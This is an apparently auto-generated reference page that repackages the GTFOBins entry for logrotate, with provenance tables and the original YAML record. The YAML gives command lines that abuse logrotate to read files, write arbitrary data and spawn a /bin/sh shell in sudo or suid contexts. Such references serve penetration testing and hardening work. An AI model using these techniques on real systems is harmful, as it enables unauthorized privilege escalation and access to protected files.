---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# logrotate

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `logrotate` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/logrotate` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [logrotate](../../tools/linux/logrotate.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | logrotate |
| name | logrotate |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/logrotate/ |

## Preserved Source Material

```yaml
_body: ''
_name: logrotate
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/logrotate
functions:
  file-read:
  - binary: false
    code: logrotate /path/to/input-file
    comment: The first word is returned in a error message.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - binary: false
    code: logrotate -l /path/to/output-file DATA
    comment: The content is written in a log file.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: 'echo -e ''/path/to/temp-file.config {\nmail x@x.x\n}'' >/path/to/temp-file.config

      echo ''/bin/sh 0<&2 1>&2'' >/path/to/temp-file.sh

      logrotate -m /path/to/temp-file.sh -f /path/to/temp-file'
    comment: This command is picky about file permissions. An existing config file can be used as weel, provided that it contains
      a mail directive.
    contexts:
      sudo: null
```
